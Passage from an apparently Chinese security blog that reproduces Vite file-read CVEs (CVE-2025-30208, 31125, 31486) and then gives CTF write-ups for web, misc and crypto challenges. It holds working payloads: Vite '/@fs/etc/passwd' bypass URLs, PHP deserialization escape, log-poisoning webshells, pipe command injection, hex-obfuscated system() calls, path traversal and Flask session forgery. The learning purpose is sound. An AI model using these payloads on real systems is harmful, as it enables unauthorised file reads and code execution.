'\\n' + hintMessage))\n    res.end()\n  } else {\n    // if the file doesn't exist, we shouldn't restrict this path as it can\n    // be an API call. Middlewares would issue a 404 if the file isn't handled\n    next()\n  }\n  return false\n}\n```\n\n我们逐层分析\n\n- `if (isFileServingAllowed(url, server))`这里的话是检测URL 是否匹配 `server.config.server.fs.allow` 配置的允许路径。默认允许路径是/src\n- `if (isFileReadable(cleanUrl(url)))`检测是否*文件存在但路径不在允许列表中*，如果存在则返回403，否则执行next()\n\n检测是否在allow允许范围内，所以这段if的意思就是如果我们传入的是特殊路径但是不在访问允许的范围内，则会终止我们的请求\n\n![image-20250414194743924](../image/achieve/202411/CVE复现/image-20250414194743924.png)\n\n在这段代码中，`return` 的作用是 **立即终止当前中间件函数的执行**，并阻止请求继续向下传递。\n\n所以这里的话漏洞点在于正则匹配无法处理掉尾部特殊字符例如`?`，`&`等，导致判断句为flase，请求继续往下传递而不会终止，这时候即使我们访问的是非法路径也会继续读取文件内容并返回\n\n分析完漏洞点，然后我们复现一下\n\n## 0x04漏洞复现\n\n然后我们试一下\n\n```\n/@fs/etc/passwd?import&raw??\n```\n\n成功回显\n\n![image-20250414172521020](../image/achieve/202411/CVE复现/image-20250414172521020.png)\n\n然后我们在tmp目录下随便写个txt文件，并尝试读取一下\n\n```\n/@fs/tmp/1.txt?import&raw??\n```\n\n![image-20250414172805529](../image/achieve/202411/CVE复现/image-20250414172805529.png)\n\n也是可以的\n\n解释一下后面的绕过机制\n\nai给出的结果是\n\n- `?import`：触发 Vite 的 **模块导入逻辑**（原本用于加载 ES 模块）。\n- `&raw??`：强制返回文件原始内容（绕过权限检查的漏洞点）。\n\n# CVE-2025-31125\n\n## 影响版本\n\n6.2.0 <= vite <= 6.2.3\n\n6.1.0 <= vite <= 6.1.2\n\n6.0.0 <= vite <= 6.0.12\n\n5.0.0 <= vite <= 5.4.15\n\nvite <= 4.5.10 \n\n对比CVE-2025-30208的影响版本\n\n6.2.0 <= Vite <= 6.2.2\n\n6.1.0 <= Vite <= 6.1.1\n\n6.0.0 <= Vite <= 6.0.11\n\n5.0.0 <= Vite <= 5.4.14\n\nVite <= 4.5.9\n\n## 从源码->漏洞成因\n\n之前在上面我们就讲过了继CVE-2025-30208之后的一些修复，也就是在v6.2.3中，我们分析一下该版本的源码\n\n![image-20250415093001405](../image/achieve/202411/CVE复现/image-20250415093001405.png)\n\n相比于之前的版本\n\n```ts\nconst trailingQuerySeparatorsRE = /[?&]+$/      \nconst urlWithoutTrailingQuerySeparators = url.replace(\n        trailingQuerySeparatorsRE,\n        '',\n      )\n```\n\n其实就是**移除 URL 末尾多余的 `?` 或 `&`**，所以30208的payload是打不进去的，但是出现了新的绕过方式CVE-2025-31125\n\n![image-20250415100210796](../image/achieve/202411/CVE复现/image-20250415100210796.png)\n\n?import&?inline=1.wasm?init 结尾允许攻击者读取任意文件，并返回文件内容（如果存在）。\n\n然后我们看一下inline参数\n\n![image-20250415102919286](../image/achieve/202411/CVE复现/image-20250415102919286.png)\n\n## 漏洞复现\n\n这里话拿vite6.2.3去进行复现\n\n正常的话是读取不了文件的\n\n![image-20250415104318207](../image/achieve/202411/CVE复现/image-20250415104318207.png)\n\nCVE-2025-30208的poc也是不行的\n\n![image-20250415104355716](../image/achieve/202411/CVE复现/image-20250415104355716.png)\n\n利用官方POC\n\n```\n/@fs/etc/passwd?import&inline=1.wasm?init\n```\n\n![image-20250415104421592](../image/achieve/202411/CVE复现/image-20250415104421592.png)\n\n成功打进去了\n\n这个CVE在6.2.4版本已被修复，但后续又出现了新的绕过方式\n\n# CVE-2025-31486\n\n## 影响版本\n\n- 6.2.0 <= Vite <= 6.2.4\n- 6.1.0 <= Vite <= 6.1.3\n- 6.0.0 <= Vite <= 6.0.13\n- 5.0.0 <= Vite <= 5.4.16\n- Vite <= 4.5.11\n\n对比CVE-2025-31125的影响版本\n\n6.2.0 <= vite <= 6.2.3\n\n6.1.0 <= vite <= 6.1.2\n\n6.0.0 <= vite <= 6.0.12\n\n5.0.0 <= vite <= 5.4.15\n\nvite <= 4.5.10 \n\n## 从源码->漏洞成因\n\n我们把6.2.4的源码下下来分析一下\n\n看看这次又有什么变化\n\n```\nconst urlRE = /[?&]url\\b/\nconst rawRE = /[?&]raw\\b/\nconst inlineRE = /[?&]inline\\b/\n```\n\n![image-20250415105503014](../image/achieve/202411/CVE复现/image-20250415105503014.png)\n\n相对于之前的来说，就是禁用了inline参数的绕过方式，那么这时候又能怎么绕过呢？我也不会，等我分析出来了再写\n\n","tags":["漏洞复现"],"categories":["CVE"]},{"title":"商丘CTF","url":"/2025/04/09/商丘CTF/","content":"\n# WEB\n\n## eeaassyy\n\n考的是查看源码的手段，f12和右键和ctrl+u用不了，可以直接把js禁用了或者在设置里点开发者工具\n\n![image-20250407105457281](../image/achieve/202411/商丘CTF/image-20250407105457281.png)\n\n## 逃\n\n```php\n<?php\nhighlight_file(__FILE__);\ninclude (\"flag.php\");\nfunction filter($payload){\n    $black_list=array(\"flag\",\"php\");\n    return str_replace($black_list,\"stop\",$payload);\n}\nclass test{\n    var $user = 'test';\n    var $pswd = 'sunshine';\n    function __construct($user){\n        $this->user=$user;\n    }\n}\n\n$payload=$_GET['payload'];\n$profile=unserialize(filter($payload));\nif ($profile->pswd=='escaping'){\n    echo \"逃出来了, 恭喜恭喜<br>\";\n    echo $flag;\n}\n?>\n```\n\n有替换函数，直接锁定是字符串逃逸，况且这里还不需要写pop链，只需要逃逸字符串就行，直接给exp\n\n```php\n<?php\nclass test{\n    var $user = 'phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp\";s:4:\"pswd\";s:8:\"escaping\";}';\n    var $pswd = 'sunshine';\n}\n\n//O:4:\"test\":2:{s:4:\"user\";s:4:\"test\";s:4:\"pswd\";s:8:\"escaping\";};s:4:\"pswd\";s:8:\"sunshine\";}\n//O:4:\"test\":2:{s:4:\"user\";s:116:\"phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp\";s:4:\"pswd\";s:8:\"escaping\";}\";s:4:\"pswd\";s:8:\"sunshine\";}\n//O:4:\"test\":2:{s:4:\"user\";s:116:\"stopstopstopstopstopstopstopstopstopstopstopstopstopstopstopstopstopstopstopstopstopstopstopstopstopstopstopstopstop\";s:4:\"pswd\";s:8:\"escaping\";}\";s:4:\"pswd\";s:8:\"sunshine\";}\n$a = new test();\n//echo serialize($a);\n$b = 'O:4:\"test\":2:{s:4:\"user\";s:116:\"phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp\";s:4:\"pswd\";s:8:\"escaping\";}\";s:4:\"pswd\";s:8:\"sunshine\";}';\necho urlencode($b);\n$b =str_replace(\"php\",\"stop\",$b);\n```\n\n把$b的内容传参就行\n\n```\n?payload=O:4:\"test\":2:{s:4:\"user\";s:116:\"phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp\";s:4:\"pswd\";s:8:\"escaping\";}\";s:4:\"pswd\";s:8:\"sunshine\";}\n```\n\n![image-20250407105706323](../image/achieve/202411/商丘CTF/image-20250407105706323.png)\n\n## Upload_Level1\n\n![image-20250407105813091](../image/achieve/202411/商丘CTF/image-20250407105813091.png)\n\n文件上传，一个简单的前端后缀名过滤，传jpg文件抓包改后缀就行，用蚁剑连接\n\n## My Blog\n\n有一个login.php，访问是一个登录界面，登录密码在/file.pdf中\n\n![image-20250407105950903](../image/achieve/202411/商丘CTF/image-20250407105950903.png)\n\n## baby include\n\n```php\n<?php\nif(isset($_GET['look'])){\n    // Great, it's the file inclusion master, we have a save !!!\n    $look = $_GET['look'];\n    $look = str_replace(\"php\", \"!!!\", $look);\n    $look = str_replace(\"data\", \"!!!\", $look);\n    $look = str_replace(\"filter\", \"!!!\", $look);\n    $look = str_replace(\"input\", \"!!!\", $look);\n    include($look);\n}else{\n    highlight_file(__FILE__);\n}\n\n?>\n```\n\n就禁用了伪协议，用日志包含就行\n\n![image-20250407110426864](../image/achieve/202411/商丘CTF/image-20250407110426864.png)\n\n是nginx的，日志文件路径默认是/var/log/nginx/access.log,访问然后传ua头写一句话木马就行\n\n## ezGame\n\n有一个flag.php文件，访问出来要求分数达到2048\n\n![image-20250407110940614](../image/achieve/202411/商丘CTF/image-20250407110940614.png)\n\n根据之前页面的score，试着传参看看能不能改分数，也是让我给蒙到了\n\n![image-20250407111023918](../image/achieve/202411/商丘CTF/image-20250407111023918.png)\n\n这道题也可以在控制台传入js代码\n\n```\nobj.score = 2048; \nobj.getFlag();   \n```\n\n![image-20250407111119809](../image/achieve/202411/商丘CTF/image-20250407111119809.png)\n\n## 商师一日游\n\n首页提示/atc1acrd.html，访问一下，在源码发现了东西\n\n![image-20250407111715895](../image/achieve/202411/XYCTF2025/image-20250407111715895.png)\n\n继续访问/atc2cnzd.php，有一段提示，伪造cookie\n\n```\n打开你的终端，构造一块fish牌的曲奇饼，上面刻下strong字样，便可获得强筋壮骨\n```\n\n![image-20250407111821455](../image/achieve/202411/商丘CTF/image-20250407111821455.png)\n\n继续/atc3oklm.php，提示在devtool开发者工具中找，找了半天发现在响应头中\n\n![image-20250407112457823](../image/achieve/202411/商丘CTF/image-20250407112457823.png)\n\n继续访问/atc4zztg.php，访问robots.txt\n\n![image-20250407112622535](../image/achieve/202411/商丘CTF/image-20250407112622535.png)\n\n继续跟着走吧\n\n```php\n $a=$_GET['hhh'];\n        if(preg_match('/^php$/im', $a)){\n            if(preg_match('/^php$/i', $a)){\n                echo 'hacker';\n            }\n            else{\n                echo xxxxxxxxxxx;\n            }\n        }\n        else{\n            echo 'nonononono';\n        }\n```\n\n需要进入第一个if但是不能进入第二个if，第一个if是多行匹配，第二个if是单行匹配，那就用%0a去换行就行\n\n```\n?hhh=%0aphp\n```\n\n![image-20250407113202593](../image/achieve/202411/商丘CTF/v)\n\n继续\n\n![image-20250407113242546](../image/achieve/202411/商丘CTF/image-20250407113242546.png)\n\n在按钮对应的源码中的把disable删掉，恢复按钮功能\n\n![image-20250407113506989](../image/achieve/202411/商丘CTF/image-20250407113506989.png)\n\n继续/atc7wedf.php\n\n一句话木马，在源码中看到通过pre标签将一句话木马解析执行了，所以可以直接连蚁剑找最后一个碎片，然后拼接所有的碎片就是flag\n\n```\nsqctf{e06e21306ab5463f894e4118c33fb3ab}\n```\n\n## 唯一\n\n啥都没有\n\n![image-20250407115701668](../image/achieve/202411/商丘CTF/image-20250407115701668.png)\n\n有点想ssti’的渲染，在网络中看到是python的\n\n![image-20250407115734964](../image/achieve/202411/商丘CTF/image-20250407115734964.png)\n\n估计是jinja2，传个note参数就出来了\n\n![image-20250407115811617](../image/achieve/202411/商丘CTF/image-20250407115811617.png)\n\n然后fenjing一把梭\n\n![image-20250407121351416](../image/achieve/202411/商丘CTF/image-20250407121351416.png)\n\n\n\n## 嘿嘿嘿\n\n```php\n<?php\nhighlight_file(__FILE__);\n\nclass hhh {\n    public $file;\n    public $content;\n\n    public function __construct($file, $content) {\n        $this->file = $file;\n        $this->content = $content;\n    }\n\n    public function __destruct() {\n        if ($this->file && $this->content) {\n            if (strpos($this->file, 'flag') !== false) {\n                die(\"No flag file!\");\n            }\n            if (file_exists($this->file)) {\n                die(\"File already exists!\");\n            }\n            file_put_contents($this->file, $this->content);\n        }\n    }\n}\n\nclass xxx {\n    public $data;\n\n    public function __construct($data) {\n        $this->data = $data;\n    }\n\n    public function __toString() {\n        return $this->data;\n    }\n}\n\nclass yyy {\n    public $path;\n    public $allowed;\n\n    public function __construct($path, $allowed) {\n        $this->path = $path;\n        $this->allowed = $allowed;\n    }\n\n    public function __toString() {\n        if ($this->allowed) {\n            return file_get_contents($this->path);\n        } else {\n            return \"Access Denied!\";\n        }\n    }\n}\n\nif (isset($_POST['data'])) {\n    $data = unserialize($_POST['data']);\n\n    if (is_array($data->file) || md5($data->file) === md5(\"flag.php\")) {\n        die(\"No cheating!\");\n    }\n\n    if (strpos($data->file, 'php://') !== false) {\n        die(\"No php protocol!\");\n    }\n\n    if ($data->content === \"GET_FLAG\") {\n        echo \"Flag: \" . file_get_contents(\"flag.php\");\n    }\n}\n?>\n```\n\n重点关注到下面的这段代码\n\n```php\nif (isset($_POST['data'])) {\n    $data = unserialize($_POST['data']);\n\n    if (is_array($data->file) || md5($data->file) === md5(\"flag.php\")) {\n        die(\"No cheating!\");\n    }\n\n    if (strpos($data->file, 'php://') !== false) {\n        die(\"No php protocol!\");\n    }\n\n    if ($data->content === \"GET_FLAG\") {\n        echo \"Flag: \" . file_get_contents(\"flag.php\");\n    }\n}\n```\n\n有file和content内容，在hhh，然后我们看hhh类中的内容\n\n```php\nclass hhh {\n    public $file;\n    public $content;\n\n    public function __construct($file, $content) {\n        $this->file = $file;\n        $this->content = $content;\n    }\n\n    public function __destruct() {\n        if ($this->file && $this->content) {\n            if (strpos($this->file, 'flag') !== false) {\n                die(\"No flag file!\");\n            }\n            if (file_exists($this->file)) {\n                die(\"File already exists!\");\n            }\n            file_put_contents($this->file, $this->content);\n        }\n    }\n}\n```\n\n在`__destruct`中有两个if语句，要求file中需要有flag，这个file文件也不能存在，不存在的话则会写入文件\n\n## File_download\n\n![image-20250407141210648](../image/achieve/202411/商丘CTF/image-20250407141210648.png)\n\n看看help\n\n![image-20250407141458813](../image/achieve/202411/商丘CTF/image-20250407141458813.png)\n\n在这个路径下传文件名可以得到文件内容，但是目前没啥文件名是已知的，回到登录页面随便传1/1然后rul中出现/index.jsp，看看能不能获取到这个文件内容\n\n```\n/DownloadServlet?filename=index.jsp\n```\n\n```js\n<%-- Created by IntelliJ IDEA. User: yuzhenzhao Date: 2025/2/19 Time: 11:50 To change this template use File | Settings | File Templates. --%> <%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%> <% // 获取请求参数 String username = request.getParameter(\"username\"); String password = request.getParameter(\"password\"); // 检查是否提交了表单 if (\"POST\".equalsIgnoreCase(request.getMethod()) && username != null && password != null) { // 不论输入什么用户名和密码，都返回登录失败的提示 out.println(\"\n登录失败，请检查用户名和密码。\n\"); } %>\n```\n\n看着没啥用，然后就没啥思路了，看看能不能找到版本漏洞\n\n随便传个路径得到报错信息出现版本\n\n![image-20250407150020952](../image/achieve/202411/商丘CTF/image-20250407150020952.png)\n\n下载源码下来分析一下\n\n\n\n漏洞复现放在另一篇文章专门讲了\n\n```\nDownloadServlet?filename=WEB-INF/web.xml\n```\n\n![image-20250407160456878](../image/achieve/202411/商丘CTF/image-20250407160456878.png)\n\n还有一个FlagManager的类，看看能不能访问到这个类\n\n根据 Java 的包和类的组织规则，该类的完整路径应该是：\n\n```\n/src/com/ctf/flag/FlagManager.java\n```\n\n- 在构建后，这个类会被编译，并在 `WEB-INF/classes` 目录下生成相应的 `.class` 文件。其路径为：\n\n```\n/WEB-INF/classes/com/ctf/flag/FlagManager.class\n```\n\n但是访问出来说需要下载后查看，一开始get访问下载不下来，post访问才能下载\n\n因为是class文件，需要反编译成java文件，用JD-GUI去进行反编译\n\n![image-20250407162912957](../image/achieve/202411/商丘CTF/image-20250407162912957.png)\n\n其中有一个加密，写个解密的脚本然后换成字符\n\n```py\ns = [110, 107, 185, 183, 183, 186, 103, 185, 99, 105, 105, 187, 105, 99, 102, 184, 185, 103, 99, 108, 186, 107, 187, 99, 183, 109, 105, 184, 102, 106, 106, 188, 109, 186, 111, 188]\n\nf = ''\nfor i in s:\n    x = (i ^ 0x30) - 38\n    f += chr(x)\n\nprint(f)\n```\n\n![image-20250407164203318](../image/achieve/202411/商丘CTF/image-20250407164203318.png)\n\n用SQCTF{}包裹一下就是flag了\n\n## Through\n\n![image-20250408001832401](../image/achieve/202411/商丘CTF/image-20250408001832401.png)\n\n存在任意文件读取，但是一开始做目录穿越读不出来，看看是不是过滤了`../`穿越符号\n\n```\n?file=..././..././..././etc/passwd\n```\n\n然后尝试读取flag，猜了一下txt和php后缀，最后发现是无后缀的\n\n![image-20250408002129645](../image/achieve/202411/商丘CTF/image-20250408002129645.png)\n\n## Input a number\n\n简单的intval函数绕过\n\n```\n?sqctf=114514.12\n```\n\n## Ping\n\n分号过滤了，用管道符就行\n\n```\n127.0.0.1|cat /f*\n```\n\n## RceMe\n\n```php\n<?php\n$command = $_GET['com'];\nif (isset($command) && strlen($command) <= 5) {\n    system($command);\n} else {\n    print(\"你小子干什么呢？\");\n}\n```\n\n限制了长度，我记得p牛师傅之前有写过文章\n\n```\n?com=ls /\n//bin dev etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var\n```\n\n可以看到有flag\n\n### shell中nl的特性\n\n在 Shell 中，`*` **匹配当前路径的非隐藏文件和目录**，`/*` → 匹配根目录下**所有文件和一级子目录**，并且nl只处理可读文本文件，会跳过目录和二进制文件\n\n![image-20250409142628774](../image/achieve/202411/商丘CTF/image-20250409142628774.png)\n\n所以直接用命令\n\n```\nnl /*\n```\n\n就行\n\n## 小小查询系统\n\nsql注入，传入id=1返回查询结果，加上单引号就报错，sqlmap一把梭就行\n\n![image-20250409143108132](../image/achieve/202411/商丘CTF/image-20250409143108132.png)![image-20250409143235141](../image/achieve/202411/商丘CTF/image-20250409143235141.png)\n\n## baby rce\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nextract($_GET);\n\n$token = false;\nif(isset($param1) && isset($param2)){\n    if(sha1($param1) == sha1($param2)){\n        $token = true;\n        echo \"Level 1 pass\\n\";\n    }\n}\n\nclass TYctf{\n    public $person = 20;\n    public $computer_number = 30;\n\n    function getNumber(){\n        if(isset($this->person)) {\n            echo $this->person;\n        }\n    }\n    function isFullUse(){\n        if($this->person != $this->computer_number){\n            echo \"computer is lacking !!!\\n\";\n        }\n        else{\n            echo \"computer is enough !!!\\n\";\n        }\n    }\n    static function getKey(){\n        include (\"flag.php\");\n        echo \"Level 2 pass\\n\";\n        echo \"You are winner, this is your reward: \\n\";\n        echo $flag;\n    }\n}\n\nif($token){\n    call_user_func($_POST['payload']);\n}\n\n?>\n```\n\nLevel1很好过，用数组绕过sha1弱比较就行\n\n```\n?param1[]=1&param2[]=2\n```\n\n然后在Level2中可以看到有flag，`call_user_func`是可以调用类中的方法的，所以直接调用就行\n\n![image-20250409143911908](../image/achieve/202411/商丘CTF/image-20250409143911908.png)\n\n```\npayload=TYctf::getKey\n```\n\n## Ez_calculate\n\n![image-20250409144032384](../image/achieve/202411/商丘CTF/image-20250409144032384.png)\n\n计算表达式的，写个脚本就行\n\n```python\nimport requests\nfrom bs4 import BeautifulSoup\nimport re\n\nurl = \"http://challenge.qsnctf.com:30979/\"\n\n\ndef solve_math_challenge():\n    with requests.Session() as s:\n        # 获取页面并提取表达式\n        get_resp = s.get(url)\n        if get_resp.status_code != 200:\n            print(\"Failed to fetch page\")\n            return\n\n        soup = BeautifulSoup(get_resp.text, \"html.parser\")\n        challenge_div = soup.find(\"div\", class_=\"challenge\")\n        if not challenge_div:\n            print(\"No challenge found\")\n            return\n\n        expression = challenge_div.text.strip()\n        if not re.match(r\"^[\\d\\+\\-\\*\\/\\(\\) ]+$\", expression):\n            print(\"Invalid expression format\")\n            return\n\n        # 计算表达式\n        try:\n            result = eval(expression)\n        except:\n            print(\"Calculation error\")\n            return\n\n        # 提交答案\n        post_data = {\"value\": result}\n        post_resp = s.post(url, data=post_data)\n\n        # 输出响应（含flag）\n        print(\"Response:\\n\", post_resp.text)\n\n\nif __name__ == \"__main__\":\n    solve_math_challenge()\n```\n\n## 白月光\n\n看版本是python3.8的，然后输入1会回显，直接fenjing一把梭\n\n![image-20250409145207857](../image/achieve/202411/商丘CTF/image-20250409145207857.png)\n\n![image-20250409145227502](../image/achieve/202411/商丘CTF/image-20250409145227502.png)\n\n参数是name\n\n```\npython -m fenjing crack --url http://challenge.qsnctf.com:31419/ --inputs name --method POST\n```\n\n![image-20250409145929052](../image/achieve/202411/商丘CTF/image-20250409145929052.png)\n\n## 无参之舞\n\n正常是打不开的，得抓包\n\n![image-20250409150232858](../image/achieve/202411/商丘CTF/image-20250409150232858.png)\n\n看到需要post传参的参数名\n\n```\nusername=sqctf&password=123456//用户名或密码错误\n```\n\n爆一下弱口令\n\n![image-20250409153838359](../image/achieve/202411/商丘CTF/image-20250409153838359.png)\n\n有一个302跳转，抓包传参再放包就行\n\n![image-20250409154046651](../image/achieve/202411/商丘CTF/image-20250409154046651.png)\n\n如果传入单个字母和数字，就会报错，根据提示猜测是无参数rce，传入phpinfo没回显但是没报错，估计是禁用了\n\n![image-20250409154704884](../image/achieve/202411/商丘CTF/image-20250409154704884.png)\n\n传入highlight_file()就会返回还差一点，用print_r可以\n\n```\n?exp=print_r(scandir('./'));\n```\n\n![image-20250409162218208](../image/achieve/202411/商丘CTF/image-20250409162218208.png)\n\n看到好多flag文件\n\n试着传入system但是发现被过滤了，转码绕过\n\n```\nexp=\"\\x73\\x79\\x73\\x74\\x65\\x6d\"(\"cat /etc/passwd\");\n等价于\nexp=system(\"cat /etc/passwd\");\n```\n\n![image-20250409162331740](../image/achieve/202411/商丘CTF/image-20250409162331740.png)\n\n这里的话必须给绝对路径的目录，不然是读不出来的\n\n```\n?exp=\"\\x73\\x79\\x73\\x74\\x65\\x6d\"(\"tac /var/www/html/f*\");\n```\n\n我也不知道为什么，测出来是这样的，后面看看源码吧\n\n## 哎呀大大大黑塔\n\n说实话这道题真的想喷，感觉啥都没考，还得硬看pv看好几遍\n\n![image-20250409165138244](../image/achieve/202411/商丘CTF/image-20250409165138244.png)\n\n## 千查万别\n\n![image-20250411233503950](../image/achieve/202411/商丘CTF/image-20250411233503950.png)\n\n可以传入文档id然后查文件，传入1显示文件不存在\n\n但是测试了一下发现存在任意文件读取\n\n```\n/view?doc=../../../../../etc/passwd\n```\n\n```\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n```\n\n然后一直没头绪，看到版本是Werkzeug/3.0.6 Python/3.8.20，就去把源码拉下来看了一下，以为是版本漏洞但是也不是\n\n后来通过目录穿越读到源码\n\n```\n../../app.py\n```\n\n```python\nfrom flask import Flask, request, render_template_string, session\nimport os\n\napp = Flask(__name__)\napp.secret_key = os.environ.get('SECRET_KEY', os.urandom(16))\n\n@app.route('/')\ndef index():\n    username = session.get('username', 'guest')\n    template = f'''\n    \n欢迎，{username}！\n\n    \n\n        输入文档ID: \n\n        \n    \n\n    '''\n    return render_template_string(template) \n\n@app.route('/view')\ndef view_doc():\n    doc = request.args.get('doc', 'test.txt')\n    base_dir = '/app/static/docs'\n    filepath = os.path.realpath(os.path.join(base_dir, doc))\n    \n    if filepath == '/flag':\n       return \"非法路径！\"\n    \n    try:\n        with open(filepath, 'r') as f:\n            content = f.read()\n        return f\"\n{content}\n\"\n    except:\n        return \"文档不存在！\"\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0')\n```\n\nsession下的ssti，但是需要密钥加密\n\n```\napp.secret_key = os.environ.get('SECRET_KEY', os.urandom(16))\n```\n\n这里提示密钥在环境变量中，SECRET_KEY=Dark_Flame\n\n```\n/proc/self/environ\n```\n\n![image-20250412012510828](../image/achieve/202411/商丘CTF/image-20250412012510828.png)\n\n用flask-unsign去伪造就行\n\n![2e7d3a690e45f0bf4b282ef6fe5e7f5f](../image/achieve/202411/商丘CTF/2e7d3a690e45f0bf4b282ef6fe5e7f5f.png)\n\n# MISC\n\n## ez_music1\n\n音频隐写，用audacity去看多视图里面就能看到了\n\n![image-20250407111333754](../image/achieve/202411/商丘CTF/image-20250407111333754.png)\n\n## love.host\n\n随波逐流foremost提取，获得ZIP中flag，最后将前缀改为SQCTF\n\n![image-20250407232621973](../image/achieve/202411/商丘CTF/image-20250407232621973.png)\n\n## 王者荣耀真是太好玩了\n\n![image-20250407232748844](../image/achieve/202411/商丘CTF/image-20250407232748844.png)\n\n搜索该用户，头像有线索\n\n![9bc916c59ecb212c59bb82a948466cf](../image/achieve/202411/商丘CTF/9bc916c59ecb212c59bb82a948466cf.jpg)\n\n百度地图搜索这个位置，看到评论，url解码获得flag\n\n## Welcome_Sign_in\n\n关注公众号然后发信息拿flag就行\n\n# 密码\n\n## 春风得意马蹄疾\n\n核心价值观编码:https://ctf.bugku.com/tool/cvecode\n\n多解码几次就出来了\n\n![image-20250407121609580](../image/achieve/202411/商丘CTF/image-20250407121609580.png)\n\n## 小白兔白又白\n\n![image-20250407144205422](../image/achieve/202411/商丘CTF/image-20250407144205422.png)\n\nbase家族多重编码\n\n Base91 -> Base64 -> Base62 -> Base16\n\n```\nU2FsdGVkX1+cEAtCb8l5oIiX+J9CwG3SpvdB38nPFkjnJ1HmRvbYQubVZDL3\n```\n\n然后根据提示找到有Rabbit加密/解密，密钥为91+64+62+16=233\n\n![image-20250407145106780](../image/achieve/202411/商丘CTF/image-20250407145106780.png)\n\n## ezCRT\n\nai一把梭\n\n```python\nimport math\nfrom gmpy2 import iroot\n\nn1 = 64461804435635694137780580883118542458520881333933248063286193178334411181758377012632600557019239684067421606269023383862049857550780830156513420820443580638506617741673175086647389161551833417527588094693084581758440289107240400738205844622196685129086909714662542181360063597475940496590936680150076590681\nn2 = 82768789263909988537493084725526319850211158112420157512492827240222158241002610490646583583091495111448413291338835784006756008201212610248425150436824240621547620572212344588627328430747049461146136035734611452915034170904765831638240799554640849909134152967494793539689224548564534973311777387005920878063\nn3 = 62107516550209183407698382807475681623862830395922060833332922340752315402552281961072427749999457737344017533524380473311833617485959469046445929625955655230750858204360677947120339189429659414555499604814322940573452873813507553588603977672509236539848025701635308206374413195614345288662257135378383463093\n\nc1 = 36267594227441244281312954686325715871875404435399039074741857061024358177876627893305437762333495044347666207430322392503053852558456027453124214782206724238951893678824112331246153437506819845173663625582632466682383580089960799423682343826068770924526488621412822617259665379521455218674231901913722061165\nc2 = 58105410211168858609707092876511568173640581816063761351545759586783802705542032125833354590550711377984529089994947048147499585647292048511175211483648376727998630887222885452118374649632155848228993361372903492029928954631998537219237912475667973649377775950834299314740179575844464625807524391212456813023\nc3 = 23948847023225161143620077929515892579240630411168735502944208192562325057681298085309091829312434095887230099608144726600918783450914411367305316475869605715020490101138282409809732960150785462082666279677485259918003470544763830384394786746843510460147027017747048708688901880287245378978587825576371865614\n\n# 验证模数是否互质\nassert all(math.gcd(n1, ni) == 1 for ni in [n2, n3]), \"模数不互质\"\n\n# 解决前两个同余方程\ndifference = (c2 - c1) % n2\ninverse_n1 = pow(n1, -1, n2)\nk_value = (difference * inverse_n1) % n2\ncombined_x = c1 + k_value * n1\n\n# 解决第三个同余方程\ncombined_n = n1 * n2\ndifference2 = (c3 - combined_x) % n3\ninverse_combined_n = pow(combined_n, -1, n3)\nk_value2 = (difference2 * inverse_combined_n) % n3\nfinal_x = combined_x + k_value2 * combined_n\n\n# 计算立方根\nm_root = iroot(final_x, 3)\nif m_root[1]:\n    # 将结果转换为字节\n    hex_representation = hex(m_root[0])[2:]  # 直接获取十六进制表示\n    if len(hex_representation) % 2 != 0:\n        hex_representation = '0' + hex_representation  # 确保偶数长度\n    flag_bytes = bytes.fromhex(hex_representation)\n\n    # 打印结果\n    print(\"原始字节:\", flag_bytes)\n    \n\n```\n\n![image-20250407194435169](../image/achieve/202411/商丘CTF/image-20250407194435169.png)\n\n## 别阴阳我了行吗？\n\n阴阳怪气解密\n\n![image-20250407233717630](../image/achieve/202411/商丘CTF/image-20250407233717630.png)\n\n## 失落矿洞中的密码\n\n得使用sagemath，一个开源的数学软件系统\n\n```py\n# 定义素数p和椭圆曲线的系数a和b\np = 7654319\na = 1234577\nb = 3213242\n\n# 创建椭圆曲线E\nE = EllipticCurve(GF(p), [a, b])\n\n# 定义基点G和公钥\nG = E(5234568, 2287747)\npublic_key = E(2366653, 1424308)\n\n# 计算私钥d（离散对数）\n# 注意：此步骤可能需要一些时间，具体取决于曲线阶的分解\nd = G.discrete_log(public_key)\n\n# 解密数据\nc1 = E(5081741, 6744615)  # 加密的第一个点\nc2 = E(610619, 6218)      # 加密的第二个点\n\n# 计算原始消息m\nm = c2 - d * c1\n\n# 计算原始消息的x和y坐标之和\nflag = m[0] + m[1]\n\n# 输出解密结果\nprint(\"x + y =\", flag)\n\n```\n\n\n\n## 简单RSA\n\n```py\nfrom sympy import factorint\nfrom Crypto.Util.number import inverse\n# 给定参数\ne = 65537\nn 